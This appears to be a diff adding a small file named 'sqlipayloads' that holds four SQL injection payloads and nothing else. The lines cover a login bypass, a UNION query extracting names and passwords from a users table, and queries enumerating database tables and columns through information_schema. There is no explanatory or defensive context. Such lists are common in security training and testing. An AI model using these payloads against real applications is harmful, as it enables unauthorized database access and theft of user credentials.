@@ -1,0 +1,5 @@
+sqlipayloads
+' OR 1=1#
+'UNION select first_name,password from users#
+'UNION SELECT table_name, NULL FROM information_schema.tables#
+'UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name= 'users'#
